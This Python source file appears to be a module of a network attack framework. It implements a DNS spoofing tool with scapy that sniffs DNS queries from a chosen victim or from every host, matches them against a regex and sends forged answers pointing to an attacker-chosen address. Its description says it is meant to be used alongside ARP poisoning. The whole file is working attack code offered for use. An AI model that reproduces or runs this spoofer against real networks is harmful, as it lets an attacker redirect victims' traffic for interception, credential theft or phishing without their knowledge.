from scapy.all import *
from colors import color
from poison import Poison
from zoption import Zoption
from threading import Thread
import stream
import util
import re
import config


class dns(Poison):
    def __init__(self):
        super(dns, self).__init__('DNS Spoof')
        conf.verb = 0
        self.dns_spoofed_pair = {}
        self.local_mac = get_if_hwaddr(config.get('iface'))
        self.config.update({"dns_name":Zoption(type = "regex", 
                                        value = None, 
                                        required = True, 
                                        display = "Regex to match DNS"),
                            "dns_spoofed":Zoption(type = "str", 
                                           value = None,
                                           required = True, 
                                        display = "Redirect DNS request to"),
                             "victim":Zoption(type = "ip", 
                                       value = None,
                                       required = False, 
                                       display = "Host to spoof requests from")
                            })
        self.info = """
                    While ARP poisoning a host, or obtaining traffic in some 
                    other shape or form, this will sniff for DNS packets
                    from a specified host for a specified URL and generate
                    a spoofed response.  

                    Because we are not working on these at the kernel level,
                    the original request will still be sent out, but the 
                    victim will not receive it in time and it will be
                    discarded.
                    """

    def initialize(self):
        """Initialize the DNS spoofer.
        """
        dns_spoofed = self.config['dns_spoofed'].value
        dns_name    = self.config['dns_name'].value
        if dns_name in self.dns_spoofed_pair:
            util.Error("DNS pattern is already being spoofed.")
            return None

        if 'www' in dns_spoofed or '.com' in dns_spoofed:
            # hostname, get ip
            dns_spoofed = util.getipbyhost(dns_spoofed)

        dns_name = re.compile(dns_name)
        self.dns_spoofed_pair[dns_name] = dns_spoofed
        self.running = True

        util.Msg('Starting DNS spoofer...')
        thread = Thread(target=self.dns_sniffer)

        self.config['dns_spoofed'].value = dns_spoofed
        self.config['dns_name'].value = dns_name
        thread.start()

        if self.config['victim'].value is None:
            return 'All DNS requests'
        else:
            return self.config['victim'].value

    def dns_sniffer(self):
        """Listen for DNS packets
        """
        filter_str = "udp and port 53"
        victim = self.config['victim'].value
        if victim is not None:
            filter_str += " and src %s" % victim
        
        sniff(filter=filter_str, store=0, prn=self.spoof_dns, 
                    stopper=self.test_stop, stopperTimeout=3)

    def spoof_dns(self, pkt):
        """Receive packets and spoof if necessary
        """
        if DNSQR in pkt and pkt[Ether].src != self.local_mac:
            for dns in self.dns_spoofed_pair.keys():
                tmp = dns.search(pkt[DNSQR].qname)
                if not tmp is None and not tmp.group(0) is None:
                    p = Ether(dst=pkt[Ether].src, src=self.local_mac)
                    p /= IP(src=pkt[IP].dst, dst=pkt[IP].src)
                    p /= UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
                    p /= DNS(id=pkt[DNS].id, qr=1L, rd=1L, ra=1L,
                        an=DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                        rclass='IN', ttl=40000,
                        rdata=self.dns_spoofed_pair[dns]), qd=pkt[DNS].qd)
                    sendp(p, count=1)
                    self.log_msg('Caught request to %s' % (pkt[DNSQR].qname))
        del(pkt)

    def shutdown(self):
        """Stop DNS spoofing
        """
        if self.running:
            util.Msg("Shutting DNS spoofers down...")
            self.running = False
            self.dns_spoofed_pair.clear()
            util.debug('DNS spoofing shutdown.')
        return

    def session_view(self):
        """ Return what to print when viewing sessions
        """
        if not self.config['victim'].value:
            data = 'Any\n'
        else:
            data = self.config['victim'].value + '\n'

        for (cnt, dns) in enumerate(self.dns_spoofed_pair):
            data += '\t\t%s|->%s [%d] %s -> %s' \
                               % (color.GREEN, color.WHITE, cnt, 
                                  dns.pattern, self.dns_spoofed_pair[dns])
        return data
